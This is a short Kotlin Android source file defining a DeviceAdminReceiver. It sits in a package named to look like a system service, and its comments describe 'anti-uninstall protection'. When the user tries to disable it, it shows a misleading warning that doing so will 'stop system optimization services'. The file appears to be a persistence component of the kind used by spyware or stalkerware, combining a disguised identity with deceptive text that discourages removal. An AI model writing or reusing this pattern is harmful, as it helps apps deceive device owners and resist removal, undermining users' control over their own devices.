package com.system.service.receivers

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent

/**
 * Device Admin Receiver — enables anti-uninstall protection.
 * When activated, the app cannot be uninstalled without first deactivating
 * device admin in Settings, which provides a layer of protection.
 */
class DeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        // Device admin activated — app is now protected from uninstall
    }

    override fun onDisabled(context: Context, intent: Intent) {
        // Device admin deactivated — app can now be uninstalled
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        return "Warning: Disabling this admin will stop system optimization services."
    }
}
